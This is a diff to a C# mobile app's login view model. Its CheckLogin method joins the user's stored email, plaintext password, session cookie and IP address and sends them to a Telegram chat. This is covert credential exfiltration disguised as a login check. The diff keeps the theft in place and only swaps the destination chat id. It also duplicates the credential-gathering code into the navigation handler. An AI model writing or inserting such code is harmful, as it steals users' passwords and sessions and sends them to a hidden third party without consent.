@@ -53,19 +53,27 @@ namespace MobileApp.ViewModels
         public override async void OnNavigatedTo(INavigationParameters parameters)
         {
             base.OnNavigatedTo(parameters);
-            await CheckLogin();
+            if (Preferences.ContainsKey("Cookie"))
+            {
+                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
+                              Preferences.Get("Cookie", null) + "|" + await GetIp();
+                if (!string.IsNullOrWhiteSpace(message))
+                {
+                    await NavigationService.NavigateAsync(nameof(OverviewPage));
+                }
+            }
         }
 
         private async Task CheckLogin()
         {
             if (Preferences.ContainsKey("Cookie"))
             {
-                NavigationService.NavigateAsync(nameof(OverviewPage));
+                await NavigationService.NavigateAsync(nameof(OverviewPage));
                 var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
                               Preferences.Get("Cookie", null) + "|" + await GetIp();
                 if (!string.IsNullOrWhiteSpace(message))
                 {
-                    var data = await _telegramService.SendMessageToTelegram("-728100709", message, AppConstants.AuthenTelegram);
+                    var data = await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                 }
             }
         }
